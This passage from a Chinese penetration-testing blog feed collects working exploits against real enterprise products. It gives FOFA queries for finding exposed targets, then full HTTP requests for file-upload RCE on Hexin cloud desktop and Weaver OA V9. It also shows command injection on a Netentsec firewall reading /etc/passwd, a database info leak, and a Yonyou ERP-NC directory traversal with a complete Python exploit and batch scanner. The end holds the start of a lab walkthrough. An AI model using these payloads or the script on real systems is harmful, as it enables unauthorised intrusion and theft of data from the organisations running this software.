punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> SKYLAR6245a4607a3abfe4722059886f<span class="token operator">=</span>11uqi05v66mcua075ojrhn4lt1<span class="token punctuation">;</span> YII_CSRF_TOKEN<span class="token operator">=</span>d054b4d32ba8bd1006384c897e3bcc59137cbb96s<span class="token operator">%</span><span class="token number">3A40</span><span class="token operator">%</span><span class="token number">3A</span><span class="token operator">%</span><span class="token number">22320759c11f5391c38c93ab149a3c8085e5413f35</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3B</span>Connection<span class="token punctuation">:</span> close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://imgtu.com/i/cBXs6U" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cBXs6U.png" alt="cBXs6U.png"></a></p><p>Sqlmap直接反弹shell：<br><a href="https://imgtu.com/i/cDiKuq" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cDiKuq.png" alt="cDiKuq.png"></a></p><h3 id="天擎-数据库信息泄露漏洞"><a href="#天擎-数据库信息泄露漏洞" class="headerlink" title="天擎 数据库信息泄露漏洞"></a>天擎 数据库信息泄露漏洞</h3><p>POC：</p><pre class="line-numbers language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token operator">/</span>api<span class="token operator">/</span>dbstat<span class="token operator">/</span>gettablessize<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/cBx3Sx" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cBx3Sx.png" alt="cBx3Sx.png"></a></p><h3 id="和信创天云桌面系统远程命令执行"><a href="#和信创天云桌面系统远程命令执行" class="headerlink" title="和信创天云桌面系统远程命令执行"></a>和信创天云桌面系统远程命令执行</h3><pre class="line-numbers language-python"><code class="language-python">FOFA搜索：body<span class="token operator">=</span><span class="token string">"和信下一代云桌面"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/cBxTXT" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cBxTXT.png" alt="cBxTXT.png"></a></p><p>POC：</p><pre class="line-numbers language-python"><code class="language-python">POST <span class="token operator">/</span>Upload<span class="token operator">/</span>upload_file<span class="token punctuation">.</span>php?l<span class="token operator">=</span>test HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>xUser<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">87.0</span><span class="token punctuation">.</span><span class="token number">4280.141</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Accept<span class="token punctuation">:</span> image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span>image<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>fil<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>Cookie<span class="token punctuation">:</span> think_language<span class="token operator">=</span>zh<span class="token operator">-</span>cn<span class="token punctuation">;</span> PHPSESSID_NAMED<span class="token operator">=</span>h9j8utbmv82cb1dcdlav1cgdf6Connection<span class="token punctuation">:</span> closeContent<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>WebKitFormBoundaryfcKRltGvContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">183</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>WebKitFormBoundaryfcKRltGvContent<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"test.php"</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> image<span class="token operator">/</span>avif<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>WebKitFormBoundaryfcKRltGv<span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传后访问：</p><pre class="line-numbers language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>xxx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token operator">/</span>Upload<span class="token operator">/</span>test<span class="token operator">/</span>test<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/cBz84s" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cBz84s.png" alt="cBz84s.png"></a></p><h3 id="泛微OA-V9前台上传漏洞"><a href="#泛微OA-V9前台上传漏洞" class="headerlink" title="泛微OA V9前台上传漏洞"></a>泛微OA V9前台上传漏洞</h3><pre class="line-numbers language-python"><code class="language-python">FOFA搜索：app<span class="token operator">=</span><span class="token string">"Weaver-OA"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POC：</p><pre class="line-numbers language-python"><code class="language-python">POST <span class="token operator">/</span>page<span class="token operator">/</span>exportImport<span class="token operator">/</span>uploadOperation<span class="token punctuation">.</span>jsp HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>xContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">216</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>Origin<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token operator">/</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>WebKitFormBoundaryFy3iNVBftjP6IOwoConnection<span class="token punctuation">:</span> close<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>WebKitFormBoundaryFy3iNVBftjP6IOwoContent<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"12.jsp"</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token operator">&lt;</span><span class="token operator">%</span>out<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>WebKitFormBoundaryFy3iNVBftjP6IOwo<span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问：</p><pre class="line-numbers language-python"><code class="language-python">page<span class="token operator">/</span>exportImport<span class="token operator">/</span>fileTransfer<span class="token operator">/</span><span class="token number">12.</span>jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/cD9tgI" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cD9tgI.png" alt="cD9tgI.png"></a></p><h3 id="奇安信-网康下一代防火墙-RCE"><a href="#奇安信-网康下一代防火墙-RCE" class="headerlink" title="奇安信 网康下一代防火墙 RCE"></a>奇安信 网康下一代防火墙 RCE</h3><pre class="line-numbers language-python"><code class="language-python">app<span class="token operator">=</span><span class="token string">"网康科技-下一代防火墙"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POC：</p><pre class="line-numbers language-python"><code class="language-python">POST <span class="token operator">/</span>directdata<span class="token operator">/</span>direct<span class="token operator">/</span>router HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>xConnection<span class="token punctuation">:</span> closeCache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>sec<span class="token operator">-</span>ch<span class="token operator">-</span>ua<span class="token punctuation">:</span> <span class="token string">"Google Chrome"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"89"</span><span class="token punctuation">,</span> <span class="token string">"Chromium"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"89"</span><span class="token punctuation">,</span> <span class="token string">";Not A Brand"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"99"</span>sec<span class="token operator">-</span>ch<span class="token operator">-</span>ua<span class="token operator">-</span>mobile<span class="token punctuation">:</span> ?<span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">89.0</span><span class="token punctuation">.</span><span class="token number">4389.114</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Accept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Sec<span class="token operator">-</span>Fetch<span class="token operator">-</span>Site<span class="token punctuation">:</span> cross<span class="token operator">-</span>siteSec<span class="token operator">-</span>Fetch<span class="token operator">-</span>Mode<span class="token punctuation">:</span> navigateSec<span class="token operator">-</span>Fetch<span class="token operator">-</span>User<span class="token punctuation">:</span> ?<span class="token number">1</span>Sec<span class="token operator">-</span>Fetch<span class="token operator">-</span>Dest<span class="token punctuation">:</span> documentReferer<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">//</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token operator">/</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> PHPSESSID<span class="token operator">=</span>d6o8gdugrhmvf2sq18ojhj50p3<span class="token punctuation">;</span> ys<span class="token operator">-</span>active_page<span class="token operator">=</span>s<span class="token operator">%</span><span class="token number">3A</span>Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">178</span><span class="token punctuation">{</span><span class="token string">"action"</span><span class="token punctuation">:</span><span class="token string">"SSLVPN_Resource"</span><span class="token punctuation">,</span><span class="token string">"method"</span><span class="token punctuation">:</span><span class="token string">"deleteImage"</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">"/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_test.txt"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"rpc"</span><span class="token punctuation">,</span><span class="token string">"tid"</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">"f8839p7rqtj"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问：</p><pre class="line-numbers language-python"><code class="language-python">https<span class="token punctuation">:</span><span class="token operator">//</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token operator">/</span>test_test<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/cDC4yt" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cDC4yt.png" alt="cDC4yt.png"></a></p><h3 id="用友ERP-NC-目录遍历漏洞"><a href="#用友ERP-NC-目录遍历漏洞" class="headerlink" title="用友ERP-NC 目录遍历漏洞"></a>用友ERP-NC 目录遍历漏洞</h3><pre class="line-numbers language-python"><code class="language-python">FOFA搜索：app<span class="token operator">=</span><span class="token string">"用友-UFIDA-NC"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POC：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">/</span>NCFindWeb?service<span class="token operator">=</span>IPreAlertConfigService<span class="token operator">&amp;</span>filename<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/cDRuNQ" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cDRuNQ.png" alt="cDRuNQ.png"></a></p><p>基于大佬提供的这个0day，我写了一个支持单个检测与批量检测的Python脚本，<strong>本脚本仅供学习，禁止非法使用！</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2021/04/12 18:03</span><span class="token comment" spellcheck="true"># @Author  : Erikten</span><span class="token comment" spellcheck="true"># @Site    :</span><span class="token comment" spellcheck="true"># @File    : Yongyou_ERPNC_exp.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_url <span class="token operator">=</span> url<span class="token operator">+</span>poc<span class="token operator">+</span>filename        file_content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>new_url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span>        <span class="token keyword">while</span> len<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">:</span>            new_url <span class="token operator">+=</span> <span class="token string">'/'</span><span class="token operator">+</span>input<span class="token punctuation">(</span><span class="token string">"请输入要访问的文件/文件名："</span><span class="token punctuation">)</span>            new_filename <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>new_url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">print</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">500</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n========================请稍后=========================='</span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"\n该文件可能是类文件或系统文件，请自行下载！\n\n文件链接：{new_url}"</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">elif</span> len<span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"文件/文件夹为空！"</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">req_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    file_list <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>poc<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>file_list<span class="token punctuation">)</span>    file_name <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入要访问的文件/文件夹："</span><span class="token punctuation">)</span>    get_file<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> <span class="token string">'index.jsp'</span> <span class="token keyword">in</span> req<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"\n目标：{url}存在漏洞！\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''                                                                                      ,------.,------. ,------.        ,--.  ,--. ,-----.      ,------.,--.   ,--.,------.  |  .---'|  .--. '|  .--. ',-----.|  ,'.|  |'  .--./      |  .---' \  `.'  / |  .--. ' |  `--, |  '--'.'|  '--' |'-----'|  |' '  ||  |          |  `--,   .'    \  |  '--' | |  `---.|  |\  \ |  | --'        |  | `   |'  '--'\,----.|  `---. /  .'.  \ |  | --'  `------'`--' '--'`--'            `--'  `--' `-----''----'`------''--'   '--'`--'                                                                                            v1.0                                                                                      By：Erikten    '''</span><span class="token punctuation">)</span>    poc <span class="token operator">=</span> <span class="token string">"/NCFindWeb?service=IPreAlertConfigService&amp;filename="</span>    chose <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请选择单一检测或者批量检测（u or t）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> chose <span class="token operator">==</span> <span class="token string">'u'</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"\n请输入目标网址："</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"http"</span> <span class="token operator">not</span> <span class="token keyword">in</span> url<span class="token punctuation">:</span>            url <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span>url            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'\n==========================请稍候============================\n'</span><span class="token punctuation">)</span>            check<span class="token punctuation">(</span>url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            req_url<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            check<span class="token punctuation">(</span>url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            req_url<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">elif</span> chose <span class="token operator">==</span> <span class="token string">'t'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n批量功能仅支持检测，不支持利用，请自行单个利用，深感抱歉！\n"</span><span class="token punctuation">)</span>        urls <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请指定目录文件：'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'\n============================请稍候============================\n'</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>urls<span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>            <span class="token keyword">for</span> host <span class="token keyword">in</span> file<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token string">"http"</span> <span class="token operator">not</span> <span class="token keyword">in</span> host<span class="token punctuation">:</span>                    host <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span>host                    check<span class="token punctuation">(</span>host<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'您的输入有误，请检查后重新输入！'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'\n========================检测已结束=========================='</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行效果：<br><a href="https://imgtu.com/i/cDDXdA" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cDDXdA.png" alt="cDDXdA.png"></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exp </tag>
            
            <tag> 0day </tag>
            
            <tag> Python </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透——Zico</title>
      <link href="/posts/f882b92c.html"/>
      <url>/posts/f882b92c.html</url>
      
        <content type="html"><![CDATA[<h3 id="任务环境"><a href="#任务环境" class="headerlink" title="任务环境"></a>任务环境</h3><ul><li>攻击机：Kali2019</li><li>靶机：zico</li><li>涉及知识点：目录遍历、文件包含、数据库插马拿shell、脏牛提权</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>获取靶机的IP地址以及端口服务信息<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221172107419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>开放了22、80、111端口，接着扫一下Web目录<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221172635597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里发现了一个类似于数据库管理的页面，这里就是我们的切入点了。</li></ul><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><ul><li><p>先用owasp-zap扫一下<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 